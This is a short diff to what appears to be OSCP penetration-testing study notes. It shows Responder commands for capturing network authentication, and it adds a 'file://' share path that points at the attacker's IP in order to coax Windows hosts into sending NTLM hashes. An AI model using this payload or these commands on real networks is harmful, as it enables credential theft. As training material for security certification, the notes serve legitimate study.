@@ -903,8 +903,12 @@ responder -I tun0 -wv
 ````
 sudo responder -I tun0 -d -w
 ````
+````
+file://///<your $ip>/Share
+````
 
-![image](https://github.com/xsudoxx/OSCP/assets/127046919/9a43953e-3ebe-4354-bf21-c5bd4982bbf6)
+![image](https://github.com/xsudoxx/OSCP/assets/127046919/a80cb512-fa68-4cf9-a8e1-565d70e52137)
+
 
 ![image](https://github.com/xsudoxx/OSCP/assets/127046919/2bb68b1f-70dc-4154-b961-3f42118b8495)
 
